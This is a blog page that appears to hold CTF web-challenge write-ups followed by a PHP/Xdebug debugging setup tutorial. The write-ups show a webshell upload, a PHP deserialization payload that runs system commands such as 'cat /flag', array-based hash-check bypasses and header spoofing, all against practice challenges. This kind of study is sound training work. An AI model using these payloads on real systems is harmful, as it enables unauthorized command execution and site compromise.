<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c0nt1nue.php?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041137531.png" alt="image-20240204113758493"></p>
<p>阅读代码是要我们用POST方法传入wqh和dsy变量，两个值不能相等但是md5值要相同，没有过滤函数可以用数组绕过</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041135746.png" alt="image-20240204113549703"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041137910.png" alt="image-20240204113740874"></p>
<p>得到flag</p>

        <h2 id="四十九、-HNCTF-2022-Week1-easy-upload"   >
          <a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="headerlink" title="四十九、[HNCTF 2022 Week1]easy_upload"></a>四十九、[HNCTF 2022 Week1]easy_upload</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041152938.png" alt="image-20240204115202903"></p>
<p>没有要求哪种类型的文件，直接上传写有一句话木马的.php文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041149550.png" alt="image-20240204114917510"></p>
<p>直接上传成功，用蚁剑连接试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041150706.png" alt="image-20240204115050649"></p>
<p>能成功，添加数据后查看根目录找到ffflllaaaggg文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041151201.png" alt="image-20240204115144168"></p>
<p>得到flag</p>

        <h2 id="五十、-SWPUCTF-2022-新生赛-1z-unserialize"   >
          <a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="五十、[SWPUCTF 2022 新生赛]1z_unserialize"></a>五十、[SWPUCTF 2022 新生赛]1z_unserialize</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103390.png" alt="image-20240205110348342"></p>
<p><em>destruct 方法在对象销毁时会自动调用，而且其中的代码会在函数调用时执行。unserialize($_POST[‘nss’]);执行完成后，这个通过 unserialize 重新创建的对象没有被任何变量引用，因此它将会被标记为不再需要，并最终会被 PHP 垃圾回收机制销毁。在对象被销毁的时候，destruct 方法会被自动调用。</em></p>
<p>题中给的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = $this-&gt;lt;</span><br><span class="line">$a($this-&gt;lly);</span><br></pre></td></tr></table></div></figure>

<p>相当于</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;lt($this-&gt;lly);//很像命令执行 函数+指令</span><br></pre></td></tr></table></div></figure>

<p><em>所以我们可以通过构造一个恶意的序列化对象，将自定义的函数传递给 $lt 属性，然后将要执行的代码（或者指向一个恶意代码文件的路径）传递给 $lly 属性。当对象被序列化后再被反序列化时，__destruct 方法会被自动调用，从而执行指定的恶意操作。</em></p>
<p><em>只要传参把$lt变成system();this-&gt;lly变成ls或者cat就是一个简单的命令注入了</em></p>
<p>先查看根目录</p>
<p>查看序列化</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class lyh&#123;</span><br><span class="line"></span><br><span class="line">  public $url = &#x27;NSSCTF.com&#x27;;</span><br><span class="line"></span><br><span class="line">  public $lt = &#x27;system&#x27;;</span><br><span class="line"></span><br><span class="line">  public $lly = &#x27;ls /&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   function  __destruct()</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">​    $a = $this-&gt;lt;</span><br><span class="line"></span><br><span class="line">​    $a($this-&gt;lly);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = new lyh();</span><br><span class="line"></span><br><span class="line">echo serialize($d);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>

<p>返回O:3:”lyh”:3:{s:3:”url”;s:10:”NSSCTF.com”;s:2:”lt”;s:6:”system”;s:3:”lly”;s:4:”ls /“;}</p>
<p>利用HackBar用POST方法给nss传参</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051109018.png" alt="image-20240205110916980"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051109275.png" alt="image-20240205110900235"></p>
<p>打开/flag文件，构造最终payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=O:3:&quot;lyh&quot;:3:&#123;s:3:&quot;url&quot;;s:10:&quot;NSSCTF.com&quot;;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:9:&quot;cat /flag&quot;;&#125; </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103322.png" alt="image-20240205110323212"></p>
<p>得到flag</p>

        <h2 id="五十一、-HNCTF-2022-Week1-What-is-Web"   >
          <a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="headerlink" title="五十一、[HNCTF 2022 Week1]What is Web"></a>五十一、[HNCTF 2022 Week1]What is Web</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124520.png" alt="image-20240205112419458"></p>
<p>页面上没找到有用的信息，看看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124874.png" alt="image-20240205112454804"></p>
<p>解码一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051125497.png" alt="image-20240205112515454"></p>
<p>得到flag</p>

        <h2 id="五十二、-HNCTF-2022-Week1-Interesting-http"   >
          <a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="headerlink" title="五十二、[HNCTF 2022 Week1]Interesting_http"></a>五十二、[HNCTF 2022 Week1]Interesting_http</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071151506.png" alt="image-20240207115118460"></p>
<p>用POST方法传入参数want，那肯定是想要flag，所以传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">want=flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071152545.png" alt="image-20240207115218491"></p>
<p>需要admin，也就是说用户(user)的值应该为admin，那修改cookie为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071154095.png" alt="image-20240207115457054"></p>
<p>看来得从本地访问，修改X-Forwarded-For为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br></pre></td></tr></table></div></figure>

<p>最终为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071151586.png" alt="image-20240207115104463"></p>
<p>EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071157102.png" alt="image-20240207115727060"></p>
<p>得到flag</p>

        <h2 id="五十三、-鹤城杯-2021-Middle-magic"   >
          <a href="#五十三、-鹤城杯-2021-Middle-magic" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十三、-鹤城杯-2021-Middle-magic" class="headerlink" title="五十三、[鹤城杯 2021]Middle magic"></a>五十三、[鹤城杯 2021]Middle magic</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071217818.png" alt="image-20240207121715759"></p>
<p>①用GET方法传入参数aaa，使用 <code>preg_replace</code> 函数来过滤掉参数中的 “level” 字符串，并将其替换为 “<!-- filtered -->“。然后，使用 <code>preg_match</code> 函数检查处理后的 <code>$aaa</code> 变量中是否包含 “pass_the_level_1#” 字符串。如果包含，表示通过了第一级的检查。可以用换行符%0A来绕过</p>
<p>②用POST方法传入admin和root_pwd参数，两者值不等但是sha1值要相等。可以用数组绕过</p>
<p>③用POST方法传入level_3，将这个字段的内容作为 JSON 字符串解析，并将解析结果存储在变量 <code>$level_3</code> 中。接下来，代码比较 <code>$level_3</code> 对象的 <code>result</code> 属性是否等于某个预定义的 <code>$result</code> 变量的值，假设这个预定义的<code>$result</code>变量值为flag</p>
<p>最终用HackBar构造为：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071216785.png" alt="image-20240207121647736"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071223259.png" alt="image-20240207122354217"></p>
<p>得到flag</p>

        <h2 id="五十四、-SWPUCTF-2022-新生赛-where-am-i"   >
          <a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="五十四、[SWPUCTF 2022 新生赛]where_am_i"></a>五十四、[SWPUCTF 2022 新生赛]where_am_i</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081051175.png" alt="image-20240208105147872"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081052730.png" alt="image-20240208105208690"></p>
<p>查看网页源代码也没什么有用的信息，但是根据后面的11位提示可以知道是要我们填写一个电话号码，而它又放了一张图，猜测可能是要填写这个图所对应的电话号码，拿去百度识图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081054637.png" alt="image-20240208105447466"></p>
<p>得知酒店名，搜索这个酒店的电话为</p>
<p>02886112888</p>
<p>填入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081055568.png" alt="image-20240208105546526"></p>
<p>得到flag</p>

        <h2 id="五十五、-FSCTF-2023-源码！启动"   >
          <a href="#五十五、-FSCTF-2023-源码！启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十五、-FSCTF-2023-源码！启动" class="headerlink" title="五十五、[FSCTF 2023]源码！启动!"></a>五十五、[FSCTF 2023]源码！启动!</h2>
      <p>名字直接提示了查看源码，尝试了右键和F12都被禁用了，那就直接在url前加上</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></div></figure>

<p>同[UUCTF 2022 新生赛]websign</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHP环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、调试搭建"   >
          <a href="#一、调试搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试搭建" class="headerlink" title="一、调试搭建"></a>一、调试搭建</h1>
      
        <h2 id="🔺Windows版本"   >
          <a href="#🔺Windows版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Windows版本" class="headerlink" title="🔺Windows版本"></a>🔺Windows版本</h2>
      
        <h2 id="1-前置安装"   >
          <a href="#1-前置安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
      <p>phpstorm+phpStudy</p>
<p>这两个需要先装好，之后利用phpStudy中自带的xdebug来调试</p>

        <h2 id="2-phpStudy设置"   >
          <a href="#2-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStudy设置" class="headerlink" title="2.phpStudy设置"></a>2.phpStudy设置</h2>
      
        <h3 id="1-php版本"   >
          <a href="#1-php版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-php版本" class="headerlink" title="(1)php版本"></a>(1)php版本</h3>
      <p>这里我的php选择的是如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png" alt="image-20220107105326110"></p>

        <h3 id="2-打开xdebug"   >
          <a href="#2-打开xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开xdebug" class="headerlink" title="(2)打开xdebug"></a>(2)打开xdebug</h3>
      <p>单击设置-&gt;扩展组件，设置如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png" alt="image-20220107105424985"></p>

        <h3 id="3-修改php-ini"   >
          <a href="#3-修改php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改php-ini" class="headerlink" title="(3)修改php.ini"></a>(3)修改php.ini</h3>
      <p>然后主界面设置-&gt;php.ini-&gt;单击对应版本，即可打开php.ini配置文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png" alt="image-20220107105552036"></p>
<p>打开之后，在最下面的xdebug设置如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></div></figure>

<p>这里参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/baocheng/p/5775938.html" >https://www.cnblogs.com/baocheng/p/5775938.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  相关的会更加详细。</p>
<p>主要是设置<code>xdebug.remote_handler</code>，<code>xdebug.remote_port</code>，<code>xdebug.remote_host</code>，<code>xdebug.profiler_enable</code>，<code>xdebug.idekey</code>，<code>xdebug.remote_enable</code></p>

        <h3 id="4-网站路径设置"   >
          <a href="#4-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-网站路径设置" class="headerlink" title="(4)网站路径设置"></a>(4)网站路径设置</h3>
      <p>主界面网站-&gt;管理-&gt;修改-&gt;根目录，然后设置为在phpStorm中存放php文件的目录，没有的可以直接创建一个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png" alt="image-20220107111415751"></p>

        <h3 id="5-开启服务"   >
          <a href="#5-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-开启服务" class="headerlink" title="(5)开启服务"></a>(5)开启服务</h3>
      <p>phpStudy中开启对应的网站服务即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png" alt="image-20220107112835096"></p>

        <h2 id="3-phpstorm设置"   >
          <a href="#3-phpstorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpstorm设置" class="headerlink" title="3.phpstorm设置"></a>3.phpstorm设置</h2>
      
        <h3 id="1-PHP版本选择"   >
          <a href="#1-PHP版本选择" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP版本选择" class="headerlink" title="(1)PHP版本选择"></a>(1)PHP版本选择</h3>
      <p>版本选择之前我们的设置好的相关版本</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png" alt="image-20220107110300128"></p>
<p>这里的CLI interpreter需要选择phpStudy中的php，点击旁边的<code>...</code>按钮，找到对应的php.exe添加即可，大多的路径如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png" alt="image-20220107110410950"></p>

        <h3 id="2-xdebug配置"   >
          <a href="#2-xdebug配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-xdebug配置" class="headerlink" title="(2)xdebug配置"></a>(2)xdebug配置</h3>
      <p>打开phpstorm，打开setting-&gt;PHP-&gt;Debug，xdebug配置如下，主要是端口对应</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png" alt="image-20220107110012400"></p>
<p>PHP-&gt;Debug-&gt;DBGp Proxy，进行相关设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png" alt="image-20220107110614445"></p>

        <h3 id="3-服务器端配置"   >
          <a href="#3-服务器端配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-服务器端配置" class="headerlink" title="(3)服务器端配置"></a>(3)服务器端配置</h3>
      <p>setting-&gt;server</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png" alt="image-20220107110138638"></p>
<p>没有的自行+号添加，名字自己定义</p>

        <h3 id="4-配置php文件路径"   >
          <a href="#4-配置php文件路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-配置php文件路径" class="headerlink" title="(4)配置php文件路径"></a>(4)配置php文件路径</h3>
      <p>Run-&gt;Edit Configurations</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png" alt="image-20220107110807337"></p>
<p>然后添加对应的调试路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png" alt="image-20220107111003896"></p>
<p>对应设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png" alt="image-20220107111151592"></p>

        <h2 id="4-开始调试"   >
          <a href="#4-开始调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开始调试" class="headerlink" title="4.开始调试"></a>4.开始调试</h2>
      <p>然后在phpStorm中对应网站的目录下的文件即可下断点开始调试</p>

        <h3 id="1-开始监听"   >
          <a href="#1-开始监听" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-开始监听" class="headerlink" title="(1)开始监听"></a>(1)开始监听</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png" alt="image-20220107111554195"></p>
<p>设置好调试环境，然后点旁边的电话，使其变成如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png" alt="image-20220107111631356"></p>

        <h3 id="2-调试"   >
          <a href="#2-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-调试" class="headerlink" title="(2)调试"></a>(2)调试</h3>
      <p>在文件中下断点，点击debug即可开始调试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png" alt="image-20220107112446079"></p>

        <h2 id="🔺Linux版本"   >
          <a href="#🔺Linux版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Linux版本" class="headerlink" title="🔺Linux版本"></a>🔺Linux版本</h2>
      
        <h2 id="1-前置安装-1"   >
          <a href="#1-前置安装-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装-1" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
      <p>用的也是PHPSTORM和宝塔linux</p>

        <h2 id="2-宝塔linux设置"   >
          <a href="#2-宝塔linux设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-宝塔linux设置" class="headerlink" title="2.宝塔linux设置"></a>2.宝塔linux设置</h2>
      
        <h3 id="1-安装xdebug"   >
          <a href="#1-安装xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装xdebug" class="headerlink" title="(1)安装xdebug"></a>(1)安装xdebug</h3>
      <p>安装好PHP之后，设置安装PHP的拓展</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png" alt="image-20220113110140841"></p>

        <h3 id="2-配置php-ini"   >
          <a href="#2-配置php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配置php-ini" class="headerlink" title="(2)配置php.ini"></a>(2)配置php.ini</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png" alt="image-20220113110241556"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">; 允许远程 可以为 On 或者 1 都表示启用 ， Off 和 0 表示关闭关闭</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">; 远程主机的 IP 这里我们填写，固定的 127.0.0.1 这里写的是PHPSTORM所在的那台机器上的IP</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">; 调试连接端口 请记住这个端口，后续会用到。此配置项默认值为 9000 ，但是通常 9000 端口被 fpm 占据 ，故更换端口。</span><br><span class="line">; 另外，请在你服务器的控制面板和服务器防火墙中开放这个端口的进出站。</span><br><span class="line">; 如果你是宝塔面板用户 请放行此端口。</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">; 接下来的值都是可选的，但是我推荐你使用</span><br><span class="line">; 连接 IDE 的 Key，请记住他，可以自己自定义，主要用来过滤请求。</span><br><span class="line">xdebug.idekey=PHPSTORM</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable=On</span><br></pre></td></tr></table></div></figure>

<p>参照</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.t1h2ua.cn/archives/69" >Linux内网服务器+宝塔+Xdebug远程调试配置 – T1h2ua’s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>保存之后，重载一下配置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png" alt="image-20220113110410355"></p>

        <h3 id="3-网站路径设置"   >
          <a href="#3-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-网站路径设置" class="headerlink" title="(3)网站路径设置"></a>(3)网站路径设置</h3>
      <p>宝塔Linux中点击网站，添加站点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png" alt="image-20220113110540548"></p>
<p>得到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png" alt="image-20220113110610661"></p>

        <h3 id="4-开启服务"   >
          <a href="#4-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开启服务" class="headerlink" title="(4)开启服务"></a>(4)开启服务</h3>
      <p>记得把对应的服务打开，nginx/apache和php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png" alt="image-20220113110735466"></p>

        <h3 id="5-放行9001端口"   >
          <a href="#5-放行9001端口" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-放行9001端口" class="headerlink" title="(5)放行9001端口"></a>(5)放行9001端口</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png" alt="image-20220113111553907"></p>

        <h2 id="3-phpStorm设置"   >
          <a href="#3-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpStorm设置" class="headerlink" title="3.phpStorm设置"></a>3.phpStorm设置</h2>
      <p>这里就都差不多，选择php版本，配置xdebug，配置Server，配置php文件路径，注意这里选取的端口为9001</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png" alt="image-20220113110926412"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png" alt="image-20220113111016050"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png" alt="image-20220113110938531"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png" alt="image-20220113111029912"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png" alt="image-20220113111210749"></p>
<p>然后就可以调试了。</p>

        <h1 id="二、数据库搭建"   >
          <a href="#二、数据库搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、数据库搭建" class="headerlink" title="二、数据库搭建"></a>二、数据库搭建</h1>
      
        <h2 id="1-phpStudy设置"   >
          <a href="#1-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpStudy设置" class="headerlink" title="1.phpStudy设置"></a>1.phpStudy设置</h2>
      
        <h3 id="1-创建数据库"   >
          <a href="#1-创建数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建数据库" class="headerlink" title="(1)创建数据库"></a>(1)创建数据库</h3>
      <p>设置数据库，没有就创建，鼠标碰到密码可以查看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png" alt="image-20220109115051455"></p>

        <h3 id="2-打开MySQL数据库"   >
          <a href="#2-打开MySQL数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开MySQL数据库" class="headerlink" title="(2)打开MySQL数据库"></a>(2)打开MySQL数据库</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png" alt="image-20220109115216201"></p>

        <h2 id="2-phpStorm设置"   >
          <a href="#2-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStorm设置" class="headerlink" title="2.phpStorm设置"></a>2.phpStorm设置</h2>
      
        <h3 id="1-设置"   >
          <a href="#1-设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-设置" class="headerlink" title="(1)设置"></a>(1)设置</h3>
      <p>view-&gt;Tool Windows-&gt;databases</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png" alt="image-20220109115314160"></p>
<p>然后创建一个连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png" alt="image-20220109115352472"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png" alt="image-20220109115418414"></p>
<p>对应输入host，账号密码即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png" alt="image-20220109115447217"></p>

        <h3 id="2-查看控制"   >
          <a href="#2-查看控制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-查看控制" class="headerlink" title="(2)查看控制"></a>(2)查看控制</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png" alt="image-20220109115523944"></p>
<p>view-&gt;tool windows-&gt;database之后，双击上面红框可以进入控制界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png" alt="image-20220109115615823"></p>
<p>然后就正常了。</p>
